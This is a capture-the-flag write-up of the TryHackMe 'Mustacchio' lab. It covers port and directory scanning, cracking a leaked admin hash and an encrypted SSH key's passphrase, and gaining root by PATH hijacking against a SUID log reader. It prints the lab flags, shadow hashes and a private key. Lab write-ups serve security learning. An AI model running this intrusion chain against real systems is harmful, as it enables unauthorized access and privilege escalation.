# Mustacchio

## Nmap

```bash
┌──(ajay㉿ajay)-[~/tryhackme/mustacchio]
└─$ nmap -p 22,80,8765 -A mustacchio.thm
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 13:05 CDT
Nmap scan report for mustacchio.thm (10.201.28.245)
Host is up (0.25s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:1b:0c:0f:fa:cf:05:be:4c:c0:7a:f1:f1:88:61:1c (RSA)
|   256 3c:fc:e8:a3:7e:03:9a:30:2c:77:e0:0a:1c:e4:52:e6 (ECDSA)
|_  256 9d:59:c6:c7:79:c5:54:c4:1d:aa:e4:d1:84:71:01:92 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Mustacchio | Home
8765/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Mustacchio | Login
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 4.X|2.6.X|3.X|5.X (97%)
OS CPE: cpe:/o:linux:linux_kernel:4.4 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:5.4
Aggressive OS guesses: Linux 4.4 (97%), Linux 4.15 (91%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.13 - 4.4 (91%), Linux 3.2 - 4.14 (91%), Linux 3.8 - 3.16 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.13 (90%), Linux 5.4 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   260.03 ms 10.17.0.1
2   ... 4
5   442.17 ms mustacchio.thm (10.201.28.245)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.98 seconds

```

![image.png](image.png)

![image.png](image%201.png)

![image.png](image%202.png)

![image.png](image%203.png)

## Gobuster

```bash
┌──(ajay㉿ajay)-[~/tryhackme/mustacchio]
└─$ gobuster dir -u http://mustacchio.thm -w /usr/share/wordlists/dirb/common.txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mustacchio.thm
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/.hta                 (Status: 403) [Size: 279]
/custom               (Status: 301) [Size: 317] [--> http://mustacchio.thm/custom/]
/fonts                (Status: 301) [Size: 316] [--> http://mustacchio.thm/fonts/]
/images               (Status: 301) [Size: 317] [--> http://mustacchio.thm/images/]
/index.html           (Status: 200) [Size: 1752]
/robots.txt           (Status: 200) [Size: 28]
/server-status        (Status: 403) [Size: 279]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
                                                               
```

![image.png](image%204.png)

```bash
┌──(ajay㉿ajay)-[~/tryhackme/mustacchio]
└─$ file users.bak                               
users.bak: SQLite 3.x database, last written using SQLite version 3034001, file counter 2, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 2
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/mustacchio]
└─$ cat users.bak      
��0]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/mustacchio]
└─$ sqlite3 users.bak       
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users
   ...> ;
admin|1868e36a6d2b17d4c2745f1659433a54d4bc5f4b

```

![image.png](image%205.png)

admin : bulldog19

```bash
┌──(ajay㉿ajay)-[~/tryhackme/mustacchio]
└─$ gobuster dir -u http://mustacchio.thm:8765 -w /usr/share/wordlists/dirb/common.txt -t 50 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://mustacchio.thm:8765
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 178]
/.htaccess            (Status: 403) [Size: 178]
/.htpasswd            (Status: 403) [Size: 178]
/assets               (Status: 301) [Size: 194] [--> http://mustacchio.thm:8765/assets/]
/auth                 (Status: 301) [Size: 194] [--> http://mustacchio.thm:8765/auth/]
/index.php            (Status: 200) [Size: 1363]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================

```

![image.png](image%206.png)

![image.png](image%207.png)

```bash
┌──(ajay㉿ajay)-[~/tryhackme/mustacchio]
└─$ cat dontforget.bak 
<?xml version="1.0" encoding="UTF-8"?>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>his paragraph was a waste of time and space. 
  If you had not read this and I had not typed this you and 
  I could’ve done something more productive than reading this
   mindlessly and carelessly as if you did not have 
   anything else to do in life. Life is so precious because 
   it is short and you are being so careless that you 
   do not realize it until now since this void paragraph mentions 
   that you are doing something so mindless, so stupid, so careless 
   that you realize that you are not using your time wisely. 
   You could’ve been playing with your dog, or eating your cat, but no. 
   You want to read this barren paragraph and expect something marvelous 
   and terrific at the end. But since you still do not realize that 
   you are wasting precious time, you still continue to read the null paragraph. 
   If you had not noticed, you have wasted an estimated time of 20 seconds.</com>
</comment>                        
```

![image.png](image%208.png)

```bash
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,D137279D69A43E71BB7FCB87FC61D25E

jqDJP+blUr+xMlASYB9t4gFyMl9VugHQJAylGZE6J/b1nG57eGYOM8wdZvVMGrfN
bNJVZXj6VluZMr9uEX8Y4vC2bt2KCBiFg224B61z4XJoiWQ35G/bXs1ZGxXoNIMU
MZdJ7DH1k226qQMtm4q96MZKEQ5ZFa032SohtfDPsoim/7dNapEOujRmw+ruBE65
l2f9wZCfDaEZvxCSyQFDJjBXm07mqfSJ3d59dwhrG9duruu1/alUUvI/jM8bOS2D
Wfyf3nkYXWyD4SPCSTKcy4U9YW26LG7KMFLcWcG0D3l6l1DwyeUBZmc8UAuQFH7E
NsNswVykkr3gswl2BMTqGz1bw/1gOdCj3Byc1LJ6mRWXfD3HSmWcc/8bHfdvVSgQ
ul7A8ROlzvri7/WHlcIA1SfcrFaUj8vfXi53fip9gBbLf6syOo0zDJ4Vvw3ycOie
TH6b6mGFexRiSaE/u3r54vZzL0KHgXtapzb4gDl/yQJo3wqD1FfY7AC12eUc9NdC
rcvG8XcDg+oBQokDnGVSnGmmvmPxIsVTT3027ykzwei3WVlagMBCOO/ekoYeNWlX
bhl1qTtQ6uC1kHjyTHUKNZVB78eDSankoERLyfcda49k/exHZYTmmKKcdjNQ+KNk
4cpvlG9Qp5Fh7uFCDWohE/qELpRKZ4/k6HiA4FS13D59JlvLCKQ6IwOfIRnstYB8
7+YoMkPWHvKjmS/vMX+elcZcvh47KNdNl4kQx65BSTmrUSK8GgGnqIJu2/G1fBk+
T+gWceS51WrxIJuimmjwuFD3S2XZaVXJSdK7ivD3E8KfWjgMx0zXFu4McnCfAWki
ahYmead6WiWHtM98G/hQ6K6yPDO7GDh7BZuMgpND/LbS+vpBPRzXotClXH6Q99I7
LIuQCN5hCb8ZHFD06A+F2aZNpg0G7FsyTwTnACtZLZ61GdxhNi+3tjOVDGQkPVUs
pkh9gqv5+mdZ6LVEqQ31eW2zdtCUfUu4WSzr+AndHPa2lqt90P+wH2iSd4bMSsxg
laXPXdcVJxmwTs+Kl56fRomKD9YdPtD4Uvyr53Ch7CiiJNsFJg4lY2s7WiAlxx9o
vpJLGMtpzhg8AXJFVAtwaRAFPxn54y1FITXX6tivk62yDRjPsXfzwbMNsvGFgvQK
DZkaeK+bBjXrmuqD4EB9K540RuO6d7kiwKNnTVgTspWlVCebMfLIi76SKtxLVpnF
6aak2iJkMIQ9I0bukDOLXMOAoEamlKJT5g+wZCC5aUI6cZG0Mv0XKbSX2DTmhyUF
ckQU/dcZcx9UXoIFhx7DesqroBTR6fEBlqsn7OPlSFj0lAHHCgIsxPawmlvSm3bs
7bdofhlZBjXYdIlZgBAqdq5jBJU8GtFcGyph9cb3f+C3nkmeDZJGRJwxUYeUS9Of
1dVkfWUhH2x9apWRV8pJM/ByDd0kNWa/c//MrGM0+DKkHoAZKfDl3sC0gdRB7kUQ
+Z87nFImxw95dxVvoZXZvoMSb7Ovf27AUhUeeU8ctWselKRmPw56+xhObBoAbRIn
7mxN/N5LlosTefJnlhdIhIDTDMsEwjACA+q686+bREd+drajgk6R9eKgSME7geVD
-----END RSA PRIVATE KEY-----
```

```bash
┌──(ajay㉿ajay)-[~/tryhackme/mustacchio]
└─$ nano id_rsa                         
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/mustacchio]
└─$ chmod 600 id_rsa
──(ajay㉿ajay)-[~/tryhackme/mustacchio]
└─$ ssh -i id_rsa barry@mustacchio.thm 
Enter passphrase for key 'id_rsa': 

                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/mustacchio]
└─$ ssh2john id_rsa > hash            
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/mustacchio]
└─$ ls
dontforget.bak  hash  id_rsa  users.bak
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/mustacchio]
└─$ cat hash          
id_rsa:$sshng$1$16$D137279D69A43E71BB7FCB87FC61D25E$1200$8ea0c93fe6e552bfb1325012601f6de20172325f55ba01d0240ca519913a27f6f59c6e7b78660e33cc1d66f54c1ab7cd6cd2556578fa565b9932bf6e117f18e2f0b66edd8a081885836db807ad73e17268896437e46fdb5ecd591b15e8348314319749ec31f5936dbaa9032d9b8abde8c64a110e5915ad37d92a21b5f0cfb288a6ffb74d6a910eba3466c3eaee044eb99767fdc1909f0da119bf1092c901432630579b4ee6a9f489ddde7d77086b1bd76eaeebb5fda95452f23f8ccf1b392d8359fc9fde79185d6c83e123c249329ccb853d616dba2c6eca3052dc59c1b40f797a9750f0c9e50166673c500b90147ec436c36cc15ca492bde0b3097604c4ea1b3d5bc3fd6039d0a3dc1c9cd4b27a9915977c3dc74a659c73ff1b1df76f552810ba5ec0f113a5cefae2eff58795c200d527dcac56948fcbdf5e2e777e2a7d8016cb7fab323a8d330c9e15bf0df270e89e4c7e9bea61857b146249a13fbb7af9e2f6732f4287817b5aa736f880397fc90268df0a83d457d8ec00b5d9e51cf4d742adcbc6f1770383ea014289039c65529c69a6be63f122c5534f7d36ef2933c1e8b759595a80c04238efde92861e3569576e1975a93b50eae0b59078f24c750a359541efc78349a9e4a0444bc9f71d6b8f64fdec476584e698a29c763350f8a364e1ca6f946f50a79161eee1420d6a2113fa842e944a678fe4e87880e054b5dc3e7d265bcb08a43a23039f2119ecb5807cefe6283243d61ef2a3992fef317f9e95c65cbe1e3b28d74d978910c7ae414939ab5122bc1a01a7a8826edbf1b57c193e4fe81671e4b9d56af1209ba29a68f0b850f74b65d96955c949d2bb8af0f713c29f5a380cc74cd716ee0c72709f0169226a162679a77a5a2587b4cf7c1bf850e8aeb23c33bb18387b059b8c829343fcb6d2fafa413d1cd7a2d0a55c7e90f7d23b2c8b9008de6109bf191c50f4e80f85d9a64da60d06ec5b324f04e7002b592d9eb519dc61362fb7b633950c64243d552ca6487d82abf9fa6759e8b544a90df5796db376d0947d4bb8592cebf809dd1cf6b696ab7dd0ffb01f68927786cc4acc6095a5cf5dd7152719b04ecf8a979e9f46898a0fd61d3ed0f852fcabe770a1ec28a224db05260e25636b3b5a2025c71f68be924b18cb69ce183c017245540b706910053f19f9e32d452135d7ead8af93adb20d18cfb177f3c1b30db2f18582f40a0d991a78af9b0635eb9aea83e0407d2b9e3446e3ba77b922c0a3674d5813b295a554279b31f2c88bbe922adc4b5699c5e9a6a4da226430843d2346ee90338b5cc380a046a694a253e60fb06420b969423a7191b432fd1729b497d834e6872505724414fdd719731f545e8205871ec37acaaba014d1e9f10196ab27ece3e54858f49401c70a022cc4f6b09a5bd29b76ecedb7687e19590635d874895980102a76ae6304953c1ad15c1b2a61f5c6f77fe0b79e499e0d9246449c315187944bd39fd5d5647d65211f6c7d6a959157ca4933f0720ddd243566bf73ffccac6334f832a41e801929f0e5dec0b481d441ee4510f99f3b9c5226c70f7977156fa195d9be83126fb3af7f6ec052151e794f1cb56b1e94a4663f0e7afb184e6c1a006d1227ee6c4dfcde4b968b1379f2679617488480d30ccb04c2300203eabaf3af9b44477e76b6a3824e91f5e2a048c13b81e543
                                                                                                                                                             
┌──(ajay㉿ajay)-[~/tryhackme/mustacchio]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash                  
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 10 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
urieljames       (id_rsa)     
1g 0:00:00:00 DONE (2025-10-08 14:39) 1.315g/s 3908Kp/s 3908Kc/s 3908KC/s urieljr.k..uriel97
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

```

## SSH

```bash
┌──(ajay㉿ajay)-[~/tryhackme/mustacchio]
└─$ ssh -i id_rsa barry@mustacchio.thm                   
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-210-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

34 packages can be updated.
16 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

barry@mustacchio:~$ id
uid=1003(barry) gid=1003(barry) groups=1003(barry)
barry@mustacchio:~$ pwd
/home/barry
barry@mustacchio:~$ ls -la
total 20
drwxr-xr-x 4 barry barry 4096 Oct  8 19:41 .
drwxr-xr-x 4 root  root  4096 Jun 12  2021 ..
drwx------ 2 barry barry 4096 Oct  8 19:41 .cache
drwxr-xr-x 2 barry barry 4096 Jun 12  2021 .ssh
-rw-r--r-- 1 barry barry   33 Jun 12  2021 user.txt
barry@mustacchio:~$ cat user.txt
62d77a4d5f97d47c5aa38b3b2651b831

```

## Privesc

```bash
barry@mustacchio:~$ ls
user.txt
barry@mustacchio:~$ cd ..
barry@mustacchio:/home$ cd joe/
barry@mustacchio:/home/joe$ ls -la
total 28
drwxr-xr-x 2 joe  joe   4096 Jun 12  2021 .
drwxr-xr-x 4 root root  4096 Jun 12  2021 ..
-rwsr-xr-x 1 root root 16832 Jun 12  2021 live_log
barry@mustacchio:/home/joe$ ./live_log 
10.17.28.158 - - [08/Oct/2025:19:22:00 +0000] "GET /home.php HTTP/1.1" 200 1077 "http://mustacchio.thm:8765/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.17.28.158 - - [08/Oct/2025:19:28:57 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.17.28.158 - - [08/Oct/2025:19:30:12 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.17.28.158 - - [08/Oct/2025:19:34:10 +0000] "POST /home.php HTTP/1.1" 200 1134 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.17.28.158 - - [08/Oct/2025:19:34:31 +0000] "POST /home.php HTTP/1.1" 200 1771 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
10.17.28.158 - - [08/Oct/2025:19:34:55 +0000] "POST /home.php HTTP/1.1" 200 1771 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
10.17.28.158 - - [08/Oct/2025:19:35:31 +0000] "POST /home.php HTTP/1.1" 200 1123 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
10.17.28.158 - - [08/Oct/2025:19:35:43 +0000] "POST /home.php HTTP/1.1" 200 1771 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
10.17.28.158 - - [08/Oct/2025:19:35:51 +0000] "POST /home.php HTTP/1.1" 200 2561 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
10.17.28.158 - - [08/Oct/2025:19:37:02 +0000] "POST /home.php HTTP/1.1" 200 2561 "http://mustacchio.thm:8765/home.php" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
^CLive Nginx Log Readerbarry@mustacchio:/home/joe$ strings live_log 
/lib64/ld-linux-x86-64.so.2
libc.so.6
setuid
printf
system
__cxa_finalize
setgid
__libc_start_main
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u+UH
[]A\A]A^A_
Live Nginx Log Reader
tail -f /var/log/nginx/access.log
:*3$"
GCC: (Ubuntu 9.3.0-17ubuntu1~20.04) 9.3.0
crtstuff.c
deregister_tm_clones
__do_global_dtors_aux
completed.8060
__do_global_dtors_aux_fini_array_entry
frame_dummy
__frame_dummy_init_array_entry
demo.c
__FRAME_END__
__init_array_end
_DYNAMIC
__init_array_start
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
__libc_csu_fini
_ITM_deregisterTMCloneTable
_edata
system@@GLIBC_2.2.5
printf@@GLIBC_2.2.5
__libc_start_main@@GLIBC_2.2.5
__data_start
__gmon_start__
__dso_handle
_IO_stdin_used
__libc_csu_init
__bss_start
main
setgid@@GLIBC_2.2.5
__TMC_END__
_ITM_registerTMCloneTable
setuid@@GLIBC_2.2.5
__cxa_finalize@@GLIBC_2.2.5
.symtab
.strtab
.shstrtab
.interp
.note.gnu.property
.note.gnu.build-id
.note.ABI-tag
.gnu.hash
.dynsym
.dynstr
.gnu.version
.gnu.version_r
.rela.dyn
.rela.plt
.init
.plt.got
.plt.sec
.text
.fini
.rodata
.eh_frame_hdr
.eh_frame
.init_array
.fini_array
.dynamic
.data
.bss
.comment
```

```bash
barry@mustacchio:~$ echo $PATH
/home/joe:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
barry@mustacchio:~$ export PATH=$PWD:$PATH
barry@mustacchio:~$ echo $PATH
/home/barry:/home/joe:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
barry@mustacchio:~$ cat tail
#!/usr/bin/python3
import pty
pty.spawn("/bin/bash")
barry@mustacchio:~$ ls -la
total 28
drwxr-xr-x 5 barry barry 4096 Oct  8 20:04 .
drwxr-xr-x 4 root  root  4096 Jun 12  2021 ..
drwx------ 2 barry barry 4096 Oct  8 19:41 .cache
drwxrwxr-x 2 barry barry 4096 Oct  8 20:04 .nano
drwxr-xr-x 2 barry barry 4096 Jun 12  2021 .ssh
-rwxrwxr-x 1 barry barry   53 Oct  8 20:04 tail
-rw-r--r-- 1 barry barry   33 Jun 12  2021 user.txt
barry@mustacchio:~$ /home/joe/live_log
root@mustacchio:~# ls
tail  user.txt
root@mustacchio:~# ls /root
root.txt
root@mustacchio:~# cat /root/root.txt
3223581420d906c4dd1a5f9b530393a5
```

```bash
joe:$6$Knz6FBbL$UEDnt.pkH6ZEDf/R4cJMLXP36diGxbnUoocdFrYWRybQ58DOP9kE4vgcU9CZXQ2e/l/HQ8UZFrQXsZTB8ZYPy1:18790:0:99999:7:::
barry:$6$230tFyKx$W3A2JMRqNrW2bFT/XsCNoPNDlTjxlqAkmLSyC9EHxRLLce8AlHQWwidzC.SSVIqzB64.zLjUTMWgrrfv0UqjG0:18790:0:99999:7:::
```